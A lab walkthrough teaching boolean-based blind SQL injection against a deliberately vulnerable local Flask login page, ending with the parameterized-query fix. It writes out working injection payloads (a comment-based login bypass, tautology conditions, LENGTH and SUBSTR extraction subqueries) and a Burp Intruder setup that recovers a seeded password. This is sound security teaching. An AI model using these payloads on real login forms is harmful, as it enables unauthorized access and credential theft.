# Walkthrough — sqli-blind-boolean

## 1. Context

The app exposes a single-page login. You type a username and password on `/`, the form submits a `POST /login` request, and the server queries a `users` table in SQLite for a row matching both fields. The response is one of two pages, both returned with HTTP 200:

- `Welcome, <username>!` when a row matches.
- `Invalid credentials.` when no row matches.

There's no session, no cookie, no flash message — just one of two body texts. Three users are seeded (`alice`, `bob`, `carol`); alice's password is `wonderland`. Alongside `users` the same database file holds a `secrets` table mirroring atom-01's schema, kept here for recognition but not the target of this atom's exploit.

The bug, the oracle, and the blind extraction all live in that small surface.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/login` view builds its SQL like this:

```python
username = request.form.get("username", "")
password = request.form.get("password", "")
# VULNERABLE: user input concatenated into SQL string
query = (
    f"SELECT username FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
row = conn.execute(query).fetchone()
```

It's the same class of bug as [`sqli-union-basic`](../sqli-union-basic/) — two user-controlled values pasted into a SQL string with f-strings, no escaping, no parameter binding. What changes is what reaches the client. In `sqli-union-basic` the `/profile` view rendered every returned row as an HTML table, so a `UNION SELECT` was enough to exfiltrate data straight through the response. Here the view ignores all columns except whether `fetchone()` returned a row or not — and the template renders one of two strings depending on that one bit. **Unlike the previous atom, there is no "executed query" debug block. Blind has to stay blind** — leaking the query to the page would defeat the point of the exercise.

So the attacker has the same injection capability but a much narrower exfil channel: a single bit per request. The rest of this walkthrough is about how that one bit, used carefully, still extracts the password.

## 3. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8006/>, sign in with `alice / wonderland` once to capture the traffic, then right-click the `POST /login` request in **Proxy → HTTP history** and choose **Send to Repeater**.

### A note on encoding the body

The previous atoms taught one rule about URL encoding — that the request line `METHOD SP URI SP VERSION` can't contain literal spaces, so anything in the query string needs `%20`. Here the payload doesn't ride in the URI; it rides in the request body as `application/x-www-form-urlencoded`. Different parser, same idea:

- The body is a series of `name=value` pairs joined by `&`.
- Three characters carry structural meaning at that layer and **must** be percent-encoded inside a value: `=` (field separator), `&` (pair separator), and `%` (the encoding escape itself).
- Spaces in form-encoded bodies are conventionally encoded too — either as `%20` or as `+`. Both decode back to a space.
- Quotes, hyphens, parentheses, commas, and SQL operators (`<`, `>`) are all legal inside a value and travel fine as-is.

In Burp Repeater you have the same two choices as before: type each space as `%20` and leave the rest literal, or paste the decoded payload, select it, and press **Ctrl+U** for aggressive percent-encoding. Both forms arrive at the Flask app as the exact same string after the body is parsed.

Each step below shows two blocks: a **Body (decoded)** for reading and a **Body (Burp-ready)** with `%20` substituted for spaces, ready to paste straight into Repeater.

### Step 1 — Confirm the injection point (login bypass)

Body (decoded):

```
username=alice' --&password=anything
```

Body (Burp-ready):

```
username=alice%27%20--&password=anything
```

Send. Response body contains `<h1>Welcome, alice!</h1>`.

Walk through what happened to the SQL. After the body parser hands the values to Flask, the f-string becomes:

```sql
SELECT username FROM users WHERE username = 'alice' --' AND password = 'anything'
```

The `'` you sent closed the username string literal. The `--` then commented out the rest of the line, including the `AND password = '...'` check the application meant to enforce. The statement reduces to `SELECT username FROM users WHERE username = 'alice'`, which returns alice's row, which means `fetchone()` returns truthy, which means the template renders the welcome page. You signed in as alice without knowing alice's password.

This is the same technique you used in `sqli-union-basic` — close a literal, comment the rest — and it serves the same role here as an *anchor*: before stepping into anything blind, prove that the input is in fact reaching the SQL engine as code.

### Step 2 — Establish the boolean oracle (TRUE branch)

The next question is whether you can drive the response toward `Welcome` using only a logical condition, not a concrete username. Try the textbook payload first:

Body (decoded):

```
username=nobody' OR '1'='1&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20%271%27%3D%271&password=x
```

Send. Response: `Invalid credentials.`.

That probably surprised you. Let's read what actually executed:

```sql
SELECT username FROM users WHERE username = 'nobody' OR '1'='1' AND password = 'x'
```

The trap is SQL operator precedence: `AND` binds tighter than `OR`. The engine groups the predicate as `username='nobody' OR ('1'='1' AND password='x')`. The first side is false (no user is literally `nobody`), and the second side requires `password='x'`, which no row satisfies. False OR false → false → `fetchone()` returns nothing → `Invalid credentials.`. The `'1'='1'` you injected is true but it never reaches the OR because the AND consumes it first.

Now the fix — keep everything else, just add `--` at the end of the username:

Body (decoded):

```
username=nobody' OR '1'='1' --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20%271%27%3D%271%27%20--&password=x
```

Send. Response: `<h1>Welcome, alice!</h1>`.

The only thing that changed between the broken and working payloads is the trailing `--`. The query is now:

```sql
SELECT username FROM users WHERE username = 'nobody' OR '1'='1' --' AND password = 'x'
```

Everything from `--` onward is a comment. What remains is `WHERE username = 'nobody' OR '1'='1'`, which is true for every row. `fetchone()` returns the first row in the table (alice, by rowid order). The response renders her as the signed-in user.

The lesson here is about `--`, not about the quotes: when you don't see the query, you have to reason about operator precedence as if you had access to the parser. The cheapest way to short-circuit it is to comment out everything after your injected condition so nothing else can re-bracket the expression. One variable changed between the two payloads, one lesson is taught.

### Step 3 — Establish the FALSE branch

Now confirm the other half of the oracle. Same shape, but with a condition that's false for every row:

Body (decoded):

```
username=nobody' OR 1=2 --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%201%3D2%20--&password=x
```

Send. Response: `Invalid credentials.`.

Two pages, two observable response bodies, perfectly distinguishable in the Burp Response panel:

- Condition true → `Welcome, alice!`
- Condition false → `Invalid credentials.`

Any boolean condition you can express in SQL can now be answered by sending one request and reading one byte sequence in the response. This is the moment the word *blind* clicks: you can't see the data, but you can ask the database yes-or-no questions and read the answers off the page. The rest of the attack is just figuring out what to ask.

### Step 4 — Extract password length

Switch from demonstrating the oracle to *using* it. Embed a subquery that asks something concrete about real data:

Body (decoded, N variable):

```
username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = N --&password=x
```

For each value of N you try, the subquery returns alice's actual password length, the comparison is true only when N matches, and the oracle flips accordingly. Run it manually a few times in Repeater:

- `N = 5` → `Invalid credentials.`
- `N = 10` → `Welcome, alice!`
- `N = 15` → `Invalid credentials.`

Conclusion: alice's password is 10 characters long. You learned a fact about data you cannot read directly, by reading one bit per request.

A real attacker would automate this with Intruder (one position, payload set `Numbers` 1–20), but doing two or three iterations by hand here is enough to feel the rhythm before the next step turns the dial up.

### Step 5 — Extract characters and automate with Burp Intruder

Same trick, finer-grained question. Instead of asking "is the length N?", ask "is the character at position P equal to C?".

Body (decoded, P = position, C = candidate character):

```
username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),P,1) = 'C' --&password=x
```

Demonstrate the first character by hand in Repeater. Substitute P=1 and try a candidate:

- P=1, C=`a` → `Invalid credentials.`
- P=1, C=`w` → `Welcome, alice!` → the first character is `w`.

Doing this by hand for all 10 positions × 26 letters would be 260 requests. That's what Intruder is for.

**Configure Intruder** (steps below use Burp Community menu names; Pro is identical):

1. **Send to Intruder.** Right-click the working Repeater request and choose **Send to Intruder**. Switch to the Intruder tab.
2. **Mark two payload positions** in the request body with `§...§`:
   - The `1` inside `,1,` (the position P).
   - The `'w'` you just used (the candidate C). Mark just the letter, not the surrounding single quotes.

   Your body should look like:

   ```
   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§' --&password=x
   ```

3. **Attack type:** `Cluster bomb`. This iterates the Cartesian product of the two payload sets — every position combined with every candidate.
4. **Payload set 1 (the `§1§` position):** type `Numbers`, from `1` to `10`, step `1`.
5. **Payload set 2 (the `§w§` candidate):** type `Brute forcer`, character set `abcdefghijklmnopqrstuvwxyz`, length `1`. (The seed uses lowercase letters only — a real attacker would typically widen to `[a-zA-Z0-9]` or printable ASCII and accept more requests.)
6. **Grep — Match.** Under the Intruder tab's **Settings** (or **Options** on older Burp versions), find the **Grep — Match** section and add the literal string `Welcome, alice!`. After the attack runs, Intruder will show a checkbox column for each request — exactly the binary oracle, surfaced as a sortable column.
7. **Start attack.** With 10 positions × 26 letters = 260 requests, the attack completes in seconds against a local app.

Sort the results by the `Welcome, alice!` column. You get 10 matches, one per position. Read them off in order of position:

```
1: w
2: o
3: n
4: d
5: e
6: r
7: l
8: a
9: n
10: d
```

Concatenated: `wonderland`. That's alice's stored password, recovered without it ever appearing in a single response body.

### Why this is "blind" — explicit contrast with sqli-union-basic

The cause of the bug is identical in both atoms: user input concatenated into a SQL string with no parameter binding. What differs is what the attacker can see and therefore the *shape* of the exploit.

In `sqli-union-basic` the exfil channel is the response body itself: `UNION` appends extra rows, the template renders every returned column, the attacker reads data straight off the page. The work fits in three payloads because each one returns the actual data.

Here there is no data channel. The body has exactly two shapes: `Welcome` or `Invalid`. The attacker inverts the problem — instead of asking "give me the data", they ask the database "is the data *equal to* this candidate?", and use the two observable response states as a single bit. Two hundred sixty bits of carefully chosen questions later, the password is reconstructed. Same bug, narrower channel, more requests, same outcome.

A real-world note while we're here: real apps store passwords as hashes, not plaintext. The blind technique above works the same way against a hash column — you'd just be extracting `$2b$12$...` instead of `wonderland`, which takes many more requests (a wider charset and a longer string). The technique is what generalizes; the column you're reading is a detail of this particular lab.

## 4. Exploitation via browser (secondary track, optional)

Steps 1, 2, and 3 are practical to run from the browser if you don't have Burp configured yet — open <http://127.0.0.1:8006/>, paste each payload's *decoded* form into the username field, type anything for password, submit, read the resulting page:

1. `alice' --` → `Welcome, alice!`
2. `nobody' OR '1'='1` (broken) → `Invalid credentials.`; then `nobody' OR '1'='1' --` (corrected) → `Welcome, alice!`
3. `nobody' OR 1=2 --` → `Invalid credentials.`

Use this track for the first read-through to *feel* the oracle flipping between the two states with your own clicks.

From Step 4 onward, the browser stops being practical. Step 4 needs you to iterate a number against the same payload, and Step 5 needs hundreds of requests fanned out across two payload positions — that's Repeater and Intruder work. Move to Burp once the oracle has clicked.

## 5. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. In short: the fixed version calls `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. With placeholders, the SQLite driver parses the SQL statement first — without the parameter values — and only afterward binds each input as a literal data value into the pre-parsed statement. No character in either input can shift the parse: `'`, `--`, `OR`, `SELECT`, parentheses, newlines all stay inside their respective string-literal slots and are never reinterpreted as SQL syntax.

Run any payload from section 3 against <http://127.0.0.1:8106/login>. Every one returns `Invalid credentials.` — including the Step 1 login bypass, which against the vulnerable version was a free pass. The two response strings haven't changed; that asymmetry is legitimate login behavior, not the bug. What the attacker has lost is any ability to inject a condition that would steer the response toward `Welcome`. The oracle still exists; the attacker no longer controls it.
